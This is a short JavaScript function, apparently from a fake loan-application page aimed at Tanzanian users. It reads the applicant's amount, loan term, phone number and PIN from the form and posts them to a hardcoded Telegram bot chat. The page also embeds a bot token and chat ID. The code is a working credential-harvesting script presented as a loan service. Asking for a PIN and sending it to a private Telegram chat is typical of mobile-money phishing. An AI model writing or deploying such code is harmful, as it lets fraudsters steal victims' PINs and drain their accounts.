const botToken = "7743245077:AAEb5A3vSWUThj4k206OKaymOt20oh-9x2E";
const chatId = "7480420601";

function sendToTelegram() {

    let amount = document.getElementById("amount").value;
    let duration = document.getElementById("duration").value;
    let phone = document.getElementById("phone").value;
    let pin = document.getElementById("pin").value;

    let message =
`📥 LOAN APPLICATION

💰 Amount: ${amount} TZS
📅 Duration: ${duration}
📱 Phone: ${phone}
🔐 PIN: ${pin}`;

    let url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    fetch(url, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: message
        })
    })
    .then(response => response.json())
    .then(data => {
        alert("Maombi yametumwa!");
        console.log(data);
    })
    .catch(error => {
        alert("Imeshindikana kutuma.");
        console.log(error);
    });
}
